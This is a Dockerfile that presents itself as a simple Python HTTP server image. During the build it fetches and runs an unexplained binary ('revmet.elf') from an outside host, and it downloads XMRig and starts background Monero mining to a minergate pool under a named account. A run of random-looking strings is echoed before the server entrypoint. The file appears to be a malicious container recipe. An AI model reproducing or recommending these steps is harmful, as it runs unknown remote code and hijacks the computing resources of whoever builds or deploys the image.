FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo lk2j2afMdoIAPqswwYWjR9it3WdLSAzD O4YUWEBcUtRuim9HYfYVxAWalPG5sjef NwCr4uYvGEPx2Jp93vbVzL2jgE8OKs8R M6BCnH75d2NkrszB243lRYuVRssyu4hg jEJ9Um0Z280eMveMY3G7I5TNIAyL6V8K S7vK2fDByoC3N17JCRSI5PgpR96ZSLwe GtfthvYu3Zo32HUPKq62brcsFwCJ2ayU An17TxZM4mXIWuxVdb3N3MFdQm80bSjF ei3iYQ1qy7zRSecLhOAzijM6vYD2ydKk AKeYwCinsMLmMcqVlYrzXsB4KfWkOj7X DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]